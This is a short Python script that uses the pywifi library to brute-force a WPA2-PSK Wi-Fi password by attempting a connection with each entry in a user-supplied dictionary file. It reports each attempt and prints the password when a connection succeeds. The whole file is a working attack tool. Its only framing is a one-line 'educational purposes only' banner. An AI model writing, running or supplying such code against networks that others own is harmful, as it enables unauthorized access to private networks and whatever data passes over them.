import pywifi
import time
import os
from pywifi import const

def connect_to_network(ssid, password):
    """Attempt to connect to the Wi-Fi network with the provided credentials."""
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.auth = const.AUTH_ALG_OPEN
    profile.key = password

    temp_profile = iface.remove_network()
    profile_id = iface.add_network(profile)
    iface.activate(profile_id)
    time.sleep(5)
    
    return iface.status() == const.IFACE_CONNECTED

def brute_force(ssid, dictionary_file):
    """Brute force WPA2 PSK by trying passwords from a dictionary file."""
    if not os.path.isfile(dictionary_file):
        print(f"Error: The file {dictionary_file} does not exist.")
        return

    with open(dictionary_file, 'r') as file:
        for password in file:
            password = password.strip()
            if password:
                print(f"Trying password: {password}")
                if connect_to_network(ssid, password):
                    print(f"Success! Password is: {password}")
                    return
                else:
                    print("Failed to connect with current password.")

    print("Password not found in dictionary.")

def main():
    ssid = input("Enter the SSID of the Wi-Fi network: ")
    dictionary_file = input("Enter the path to the password dictionary file: ")

    try:
        brute_force(ssid, dictionary_file)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    print("This script is intended for educational purposes only.")
    main()